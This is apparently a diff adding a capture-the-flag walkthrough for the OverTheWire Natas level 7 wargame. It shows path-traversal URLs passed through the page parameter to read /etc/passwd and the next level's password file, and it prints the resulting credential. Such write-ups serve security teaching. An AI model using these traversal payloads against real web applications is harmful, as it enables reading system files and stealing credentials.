@@ -1,0 +1,32 @@
+In natas7, we have 2 links: Home and About. Clicking those,
+we don't get much information; however, we see the URL bar on our
+browser changes like:
+
+http://natas7.natas.labs.overthewire.org/index.php?page=home
+
+So, it seems like the index.php is responsible to show both the
+links within itself, and including the .php source files with
+the GET parameter <page>.
+
+Maybe we can use this GET parameter to include local files.
+Let us try the following:
+
+http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/passwd
+
+We get the desired response:
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:
+(...)
+(...)
+
+Since we know where the passwords are stored for the level,
+let us include the password file:
+
+http://natas7.natas.labs.overthewire.org/index.php?page=../../../../../etc/natas_webpass/natas8
+
+We get the following password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+So, the credentials are:
+
+Username: natas8
+Password: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
